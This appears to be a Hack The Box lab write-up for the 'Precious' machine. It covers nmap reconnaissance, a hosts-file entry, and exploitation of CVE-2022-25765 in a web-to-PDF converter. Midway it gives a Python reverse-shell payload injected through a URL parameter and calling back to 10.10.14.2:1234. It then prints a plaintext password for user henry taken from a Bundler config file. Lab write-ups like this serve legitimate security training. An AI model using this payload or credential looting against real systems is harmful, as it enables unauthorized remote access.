# Precious - Hack The Box

## Initially info gathering

### Run an nmap script

> nmap -sC -sV 10.10.11.189

'''
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 19:43 EST
Nmap scan report for 10.10.11.189
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 secondsStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 19:43 EST
Nmap scan report for 10.10.11.189
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
'''

Going to 10.10.11.189:80 in a browser, shows us that's it's trying to reach precious.htb. So we need to add that to our hosts file so we can load the webpage.

> sudo nano /etc/hosts

'''
10.10.11.189    precious.htb
'''

We find a page that says it can Convert Web Page to PDF, and asks us to enter a URL to fetch something.

## Reverse payloard for CVE-2022-25765

> http://xx.xx.xx.xx/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

We come backed signed in as the user ruby.

Found another home directory named user
Then navigated to /home/ruby/.bundle and found a config with the contents:

'''
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH
ruby@precious:~/.bundle$ ^C
'''

Got henry's password and we can ssh in using his account




